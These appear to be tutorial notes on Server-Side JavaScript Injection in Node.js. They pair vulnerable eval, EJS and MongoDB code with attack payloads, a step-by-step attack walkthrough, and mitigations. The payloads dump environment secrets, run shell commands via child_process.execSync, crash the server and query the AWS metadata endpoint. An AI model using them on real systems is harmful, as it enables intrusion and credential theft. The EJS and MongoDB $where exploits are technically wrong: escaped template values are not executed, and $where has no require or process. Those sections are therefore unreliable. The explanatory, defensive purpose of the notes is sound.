# Server-Side JavaScript Injection (SSJI) – Detailed Notes

## 🔹 1. What is SSJI?

**Server-Side JavaScript Injection (SSJI)** occurs when a web application takes **untrusted user input** and executes it as **JavaScript code on the server** (usually in a Node.js environment).

Because of

1. inadequate input validation
1. Direct execution of code. Provided by the user
1. using dangerous functions like “new function”
1. Insecure deserialzation

This is similar to **SQL Injection** but instead of SQL, the attacker injects **JavaScript**.

⚠️ Why dangerous?

- Full **Remote Code Execution (RCE)**
- **Sensitive data exposure** (DB passwords, AWS keys)
- **Pivot attacks** (SSRF to internal systems)
- **Denial of Service**

---

## 🔹 2. Common Causes of SSJI

- Use of `eval()`, `Function()`, or `setTimeout()` on untrusted input.
- Unsafe template engines (`EJS`, `Handlebars`, `Pug`) with unescaped user input.
- NoSQL injections in MongoDB using `$where` or `mapReduce`.
- Developers trying to "parse expressions" without sanitization.

---

## 🔹 3. Types of SSJI

### **(a) Eval-based SSJI**

The most classic case: user input directly evaluated with `eval`.

#### Vulnerable Code

```js
app.get("/calc", (req, res) => {
  const expr = req.query.expr;
  const result = eval(expr); // ❌ Dangerous
  res.send("Result: " + result);
});
```

#### Attacks

1. Normal use:

   ```
   /calc?expr=2+2 → Result: 4
   ```

2. Leak OS info:

   ```
   /calc?expr=process.platform → Result: linux
   ```

3. Dump env variables:

   ```
   /calc?expr=JSON.stringify(process.env)
   → {"DB_PASS":"secret","AWS_KEY":"AKIA..."}
   ```

4. Remote Code Execution (RCE):
   ```
   /calc?expr=require('child_process').execSync('ls').toString()
   → lists files on server
   ```

---

### **(b) Template Injection → SSJI**

Some template engines allow raw JS execution if user input is not escaped.

#### Vulnerable Code

```js
app.get("/profile", (req, res) => {
  res.render("profile.ejs", { name: req.query.name });
});
```

#### Template (profile.ejs)

```ejs
<h1>Welcome <%= name %></h1>
```

#### Exploit

```
/profile?name=<%= process.env.DB_PASS %>
→ Displays DB password
```

Or:

```
/profile?name=<%= require('child_process').execSync('id').toString() %>
→ Executes system command
```

---

### **(c) NoSQL Injection (MongoDB with JS)**

MongoDB allows JavaScript in `$where`.

#### Vulnerable Code

```js
db.users.findOne({ $where: "this.username == '" + req.query.username + "'" });
```

#### Exploit

```
/user?username=' || process.exit() || '
→ crashes the server
```

Or:

```
/user?username='; return require("child_process").execSync("ls").toString(); //
→ executes system command
```

---

## 🔹 4. Step-by-Step Attack Simulation (Eval Example)

1. Attacker tests app:

   ```
   /calc?expr=2+3 → Result: 5
   ```

2. Enumerates system:

   ```
   /calc?expr=process.version → v18.15.0
   ```

3. Dumps secrets:

   ```
   /calc?expr=JSON.stringify(process.env)
   ```

4. Achieves RCE:

   ```
   /calc?expr=require('child_process').execSync('ls').toString()
   ```

5. Performs SSRF to AWS metadata:
   ```
   /calc?expr=require('child_process').execSync('curl http://169.254.169.254/latest/meta-data/').toString()
   ```

💀 Server is fully compromised.

---

## 🔹 5. Real-World Impact of SSJI

- **Data exfiltration**: database creds, API keys, tokens.
- **Cloud compromise**: via AWS metadata service.
- **Persistence**: attacker uploads backdoors.
- **Pivoting**: attacker uses server to attack internal services.

---

## 🔹 6. Mitigation Strategies

✅ **Avoid `eval`, `Function`, `setTimeout(userInput)`** with user input.

✅ Use **safe expression evaluators**:

```js
const { Parser } = require("expr-eval");
const parser = new Parser();
parser.evaluate("2+3*4"); // ✅ Only math, no JS execution
```

✅ For template engines:

- Use escaping (`<%= %>` in EJS, not `<%- %>`).
- Don’t pass raw user input directly into templates.

✅ For MongoDB:

- Don’t use `$where`.
- Disable server-side JavaScript (`--noscripting`).

✅ Security hardening:

- Enforce **input validation** (whitelist patterns).
- Use **linters** (`eslint` → `no-eval` rule).
- Run apps with **least privilege IAM roles**.

---

## 🔹 7. Safe Version of Calculator App

```js
const express = require("express");
const { Parser } = require("expr-eval");
const app = express();
const parser = new Parser();

app.get("/calc", (req, res) => {
  try {
    const expr = req.query.expr;
    const result = parser.evaluate(expr); // ✅ safe math only
    res.send("Result: " + result);
  } catch {
    res.status(400).send("Invalid input");
  }
});

app.listen(3000, () => console.log("Safe calc on http://localhost:3000"));
```

---

# ⚡ Key Takeaway

**SSJI = Server-Side JavaScript Injection.**

- Caused by **unsafe execution of user input**.
- Leads to **RCE, data leaks, SSRF, and full compromise**.
- Prevent by **never executing raw input**, using **safe parsers**, and enforcing **input validation**.
